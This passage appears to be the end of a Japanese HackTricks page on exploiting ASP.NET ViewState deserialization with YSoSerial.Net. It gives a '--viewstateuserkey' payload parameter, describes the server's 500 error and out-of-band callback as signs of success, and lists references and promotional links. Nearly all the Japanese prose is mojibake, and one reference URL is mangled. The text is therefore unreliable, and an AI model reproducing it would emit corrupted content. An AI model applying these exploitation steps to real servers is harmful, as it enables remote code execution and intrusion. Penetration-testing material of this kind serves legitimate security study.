ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ­£ã—ãä½œæˆã™ã‚‹ãŸã‚ã«ã¯ã€ã‚‚ã†1ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸã—ãŸæ‚ªç”¨ã®çµæœ <a href="#poc" id="poc"></a>

ã™ã¹ã¦ã®ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã«ãŠã„ã¦ã€ViewState YSoSerial.Net ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ**æˆåŠŸ**ã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ã€Œ**500 Internal server error**ã€ã§å¿œç­”ã—ã€å¿œç­”å†…å®¹ã¯ã€Œ**ã“ã®ãƒšãƒ¼ã‚¸ã®çŠ¶æ…‹æƒ…å ±ã¯ç„¡åŠ¹ã§ã‚ã‚Šã€ç ´æã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€ã¨ãªã‚Šã€OOB ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å–ã‚Šã¾ã™ã€‚

[ã“ã¡ã‚‰ã§ã•ã‚‰ã«æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## å‚è€ƒæ–‡çŒ®

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ’ãƒ³ãƒˆ**: **Intigriti**ã«**ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯**ãƒãƒƒã‚«ãƒ¼ã«ã‚ˆã£ã¦ã€ãƒãƒƒã‚«ãƒ¼ã®ãŸã‚ã«ä½œã‚‰ã‚ŒãŸãƒ—ãƒ¬ãƒŸã‚¢ãƒ ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã§ã™ï¼ä»Šæ—¥ã€[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ã«å‚åŠ ã—ã€æœ€å¤§**$100,000**ã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã‚’ç²å¾—ã—å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
